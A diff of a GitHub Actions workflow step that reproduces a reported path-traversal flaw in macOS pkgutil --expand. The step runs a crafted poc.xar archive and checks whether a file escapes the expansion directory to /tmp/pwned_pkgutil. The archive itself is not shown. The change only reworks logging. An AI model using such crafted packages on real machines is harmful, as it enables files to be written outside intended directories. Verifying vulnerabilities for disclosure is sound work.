@@ -25,60 +25,59 @@ jobs:
       - name: Run PoC — pkgutil --expand path traversal
         run: |
           mkdir -p results
-          {
-            echo "======================================"
-            echo "  pkgutil Path Traversal PoC"
-            echo "  Report: OE1104428478322"
-            echo "======================================"
-            echo ""
-            echo "=== System ==="
-            sw_vers
-            uname -m
-            echo ""
-            echo "=== pkgutil location ==="
-            which pkgutil
-            file "$(which pkgutil)"
-            pkgutil --version 2>/dev/null || echo "(no --version flag)"
-            echo ""
-            echo "=== poc.xar embedded filename ==="
-            python3 inspect_poc.py poc.xar
-            echo ""
-            echo "=== Running: pkgutil --expand poc.xar /tmp/safe_expand_dir ==="
-            SAFE_DIR=/tmp/safe_expand_dir
-            ESCAPED=/tmp/pwned_pkgutil
-            rm -rf "$SAFE_DIR" "$ESCAPED"
-            # NOTE: do NOT mkdir - pkgutil creates the destination itself
-            set -x
-            pkgutil --expand poc.xar "$SAFE_DIR" 2>&1; PKGUTIL_EXIT=$?
-            set +x
-            echo "pkgutil exit code: $PKGUTIL_EXIT"
-            echo ""
-            echo "=== Contents inside safe_expand_dir (recursive) ==="
-            find "$SAFE_DIR" 2>/dev/null | while read f; do
-              echo "  $f"
-              [ -f "$f" ] && echo "    contents: $(cat "$f" 2>/dev/null || echo '(binary)')"
-            done
-            echo ""
-            echo "=== Broader /tmp scan for unexpected writes ==="
-            find /tmp -maxdepth 4 2>/dev/null | sort
-            echo ""
-            echo "=== Out-of-bounds check: /tmp/pwned_pkgutil ==="
-            if [ -e "$ESCAPED" ]; then
-              echo "RESULT: VULNERABLE"
-              echo "File written OUTSIDE expansion directory:"
-              ls -la "$ESCAPED"
-              echo "Contents: $(cat "$ESCAPED")"
-            else
-              echo "RESULT: /tmp/pwned_pkgutil NOT created"
-              # Also check if pkgutil created it inside the safe dir under a mangled name
-              echo ""
-              echo "=== Any file containing 'pwned' anywhere in /tmp ==="
-              find /tmp -name '*pwned*' 2>/dev/null || echo "(none)"
-              echo ""
-              echo "=== Any file containing traversal payload ==="
-              grep -rl 'pwned via pkgutil' /tmp 2>/dev/null || echo "(none)"
-            fi
-          } | tee results/poc_terminal_log.txt
+          LOG=results/poc_terminal_log.txt
+          log() { echo "$@" | tee -a "$LOG"; }
+
+          log "======================================"
+          log "  pkgutil Path Traversal PoC"
+          log "  Report: OE1104428478322"
+          log "======================================"
+          log ""
+          log "=== System ==="
+          sw_vers 2>&1 | tee -a "$LOG"
+          uname -m 2>&1 | tee -a "$LOG"
+          log ""
+          log "=== pkgutil location ==="
+          which pkgutil 2>&1 | tee -a "$LOG"
+          file "$(which pkgutil)" 2>&1 | tee -a "$LOG"
+          log ""
+          log "=== poc.xar embedded filename ==="
+          python3 inspect_poc.py poc.xar 2>&1 | tee -a "$LOG"
+          log ""
+          log "=== Running: pkgutil --expand poc.xar /tmp/safe_expand_dir ==="
+          SAFE_DIR=/tmp/safe_expand_dir
+          ESCAPED=/tmp/pwned_pkgutil
+          rm -rf "$SAFE_DIR" "$ESCAPED"
+          pkgutil --expand poc.xar "$SAFE_DIR" 2>&1 | tee -a "$LOG"
+          PKGUTIL_EXIT=${PIPESTATUS[0]}
+          log "pkgutil exit code: $PKGUTIL_EXIT"
+          log ""
+          log "=== Contents inside safe_expand_dir (recursive) ==="
+          find "$SAFE_DIR" 2>/dev/null >> "$LOG" || log "(safe_expand_dir not found)"
+          log ""
+          log "=== Broader /tmp scan for unexpected writes ==="
+          find /tmp -maxdepth 4 2>/dev/null | sort >> "$LOG"
+          log ""
+          log "=== Out-of-bounds check: /tmp/pwned_pkgutil ==="
+          if [ -e "$ESCAPED" ]; then
+            log "RESULT: VULNERABLE"
+            log "File written OUTSIDE expansion directory:"
+            ls -la "$ESCAPED" 2>&1 | tee -a "$LOG"
+            log "Contents: $(cat "$ESCAPED")"
+          else
+            log "RESULT: /tmp/pwned_pkgutil NOT created"
+            log ""
+            log "=== Any file containing 'pwned' anywhere in /tmp ==="
+            find /tmp -name '*pwned*' 2>/dev/null >> "$LOG" || log "(none)"
+            log ""
+            log "=== Any file containing traversal payload ==="
+            grep -rl 'pwned via pkgutil' /tmp 2>/dev/null >> "$LOG" || log "(none)"
+          fi
+          log ""
+          log "=== END OF LOG ==="
+          echo ""
+          echo "--- Full log follows ---"
+          cat "$LOG"
 
       - name: Collect and commit results
         if: always()
